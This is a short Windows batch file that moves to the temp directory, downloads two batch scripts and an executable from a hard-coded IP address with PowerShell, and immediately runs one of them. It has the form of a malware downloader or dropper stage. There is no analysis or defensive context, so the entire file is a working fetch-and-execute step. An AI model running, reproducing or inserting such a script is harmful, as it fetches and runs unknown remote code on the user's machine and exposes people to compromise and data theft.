@echo off

cd %temp%
powershell wget "http://143.42.5.48/start.bat" -O "start.bat"
powershell wget "http://143.42.5.48/main.exe" -O "main.exe"
powershell wget "http://143.42.5.48/transfer.bat" -O "transfer.bat"

start start.bat